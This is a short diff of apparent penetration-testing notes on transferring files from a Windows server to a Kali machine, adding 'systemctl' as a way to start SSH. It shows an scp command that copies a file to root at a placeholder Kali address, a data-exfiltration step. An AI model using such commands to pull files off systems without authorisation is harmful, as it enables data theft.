@@ -17,7 +17,7 @@ Option2) PowerShell Web Uploads :- We can run the upload server in kali to get f
 Below one is tested and working 
 
 Step 1) Start the SSH service on Kali 
-    service start ssh 
+    service start ssh or sudo systemctl start ssh
 
 Step 2) From the windows server we can run the below command format to transfer the file. 
     scp <File Name> root@<Kali IP address>:/<Destination path of the file>
